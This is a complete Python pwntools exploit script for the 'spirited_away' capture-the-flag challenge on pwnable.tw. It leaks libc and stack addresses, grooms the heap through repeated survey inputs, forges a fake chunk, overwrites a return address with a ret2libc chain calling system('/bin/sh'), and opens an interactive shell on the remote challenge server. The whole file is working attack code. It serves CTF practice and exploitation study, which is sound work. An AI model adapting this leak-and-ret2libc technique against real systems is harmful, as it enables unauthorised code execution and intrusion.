#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys
import time

local = 0

def conn():
	global local
	local = 0
	debug = 0
	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./spirited_away_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x0804864F
				c
				x/30xg 0x804a000
			''')
		else:
			#raw_input('DEBUG')
			pass
	else:
		s = remote('chall.pwnable.tw', 10204)

	return s

s = conn()

elf = ELF('spirited_away_patched')
libc = ELF('libc_32.so.6')

def DEBUG():
	gdb.attach(s, gdbscript='''
		b*0x0804868F
		b*0x080488C9
		b*0x0804864F
		b*0x080487F3
		c
	''')

def survey(name, age, why, cmt, go):
	if name:
		s.sendafter(b'Please enter your name: ', name)
	if age:
		s.sendafter(b'Please enter your age: ', age)
	if why:
		s.sendafter(b'Why did you came to see this movie? ', why)
	if cmt:
		s.sendafter(b'Please enter your comment: ', cmt)
	d = s.recvuntil(b'Would you like to leave another comment? <y/n>: ')
	if go:	
		s.send(go)
	return d

libc_leak = int.from_bytes(survey(b'a\x00', b'b\x00', b'a' * 24, b'd\x00', b'y\x00')[56:60], byteorder = 'little', signed = False)
libc.address = libc_leak - 0x675e7

log.info('Libc leak: 0x%x', libc_leak)
log.info('Libc base: 0x%x', libc.address)
log.info('system: 0x%x', libc.symbols['system'])
log.info('exit: 0x%x', libc.symbols['exit'])
log.info('/bin/sh: 0x%x', next(libc.search(b'/bin/sh')))

stack_leak = int.from_bytes(survey(b'a\x00', None, b'a' * 80, b'd\x00', b'y\x00')[112:116], byteorder = 'little', signed = False)
log.info('Stack leak: 0x%x', stack_leak)

for i in range(8):
	survey(b'a\x00', None, b'c\x00', b'd\x00', b'y\x00')

survey(None, None, b'c\x00', None, b'y\x00')

for i in range(89):
	survey(None, None, b'c\x00', None, b'y\x00')

survey(b'a\x00', None, p32(0) + p32(0x41) + b'A' * 0x38 + p32(0) + p32(0x21), b'b' * 84 + p32(stack_leak - 0x68), b'y\x00')
survey(b'a' * 0x48 + p32(0) + p32(libc.symbols['system']) + p32(libc.symbols['exit']) + p32(next(libc.search(b'/bin/sh'))), None, b'A\x00', b'b\x00' , b'n\x00')

s.interactive()
